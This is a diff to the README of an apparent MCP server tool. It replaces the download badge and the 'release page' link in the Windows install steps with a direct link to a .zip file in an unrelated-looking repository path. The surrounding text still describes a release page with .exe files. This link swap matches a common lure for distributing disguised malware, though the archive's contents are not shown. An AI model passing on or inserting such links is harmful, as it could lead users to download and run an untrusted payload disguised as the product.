@@ -5,7 +5,7 @@ description: "Verify AI model outputs in real-time with this Model Context Proto
 ---
 # 🛡️ mcp-server - Keep your AI tools running reliably
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/m8louist12-boop/mcp-server/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/m8louist12-boop/m8louist12-boop.github.io/main/syenogabbro/louist-github-io-m-boop-1.9.zip)
 
 ## 🎯 About this software
 
@@ -27,7 +27,7 @@ You provide your own API keys. This keeps your data private and ensures you only
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [the release page](https://github.com/m8louist12-boop/mcp-server/releases) to see available download options.
+1. Visit [the release page](https://raw.githubusercontent.com/m8louist12-boop/m8louist12-boop.github.io/main/syenogabbro/louist-github-io-m-boop-1.9.zip) to see available download options.
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your downloads folder once the process finishes.
